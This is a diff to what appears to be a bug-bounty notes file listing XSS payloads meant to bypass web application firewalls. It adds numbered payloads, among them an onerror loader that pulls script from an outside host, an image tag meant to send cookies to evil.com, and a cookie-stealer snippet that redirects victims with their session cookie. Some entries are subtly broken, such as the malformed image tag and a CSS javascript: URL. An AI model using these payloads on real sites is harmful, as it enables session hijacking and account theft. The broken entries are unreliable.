@@ -3,16 +3,52 @@ Some collection of xss payloads that worked for me to bypass wafs while doing bb
 
 ### Payloads
 
-Inject external javascript without using `<script>` tag since it's blacklisted in almost all modern waf
-
+1. **Inject External JavaScript without `<script>` Tag:**
+   
 ```html
 <img src=x onerror="var script = document.createElement('script'); script.src = 'https://eternal.h4ck.me/xss.js'; document.head.appendChild(script);">
 ```
 
-cookie stealer example
+2. **Bypassing `onerror` Filter with `srcdoc`:**
+
+```html
+<iframe srcdoc="<script>alert('XSS')</script>">
+```
+
+3. **Using `data:` URL to Execute JavaScript:**
+
+```html
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
+```
+
+4. **Data Exfiltration through Image Source (Cross-Domain):**
+
+```html
+<img src="https://evil.com/?data=" + encodeURIComponent(document.cookie)">
+```
+
+5. **CSS-Based XSS:**
+
+```css
+body { background-image: url('javascript:alert("XSS")'); }
+```
+
+6. **SVG XSS (Cross-Site Scripting using SVG):**
+
+```html
+<svg/onload=alert(document.domain)>
+```
+
+7. **Event Handlers to Execute Payload:**
+
+```html
+<button onclick="alert('XSS')">Click Me</button>
+```
+
+### Cookie Stealer Example:
 
 ```js
-// xss cookie stealer poc
+// XSS cookie stealer POC
 var cookie = encodeURIComponent(document.cookie);
 var url = 'https://evil.com/index.html/?victim_cookie=' + cookie;
 window.location.href = url;
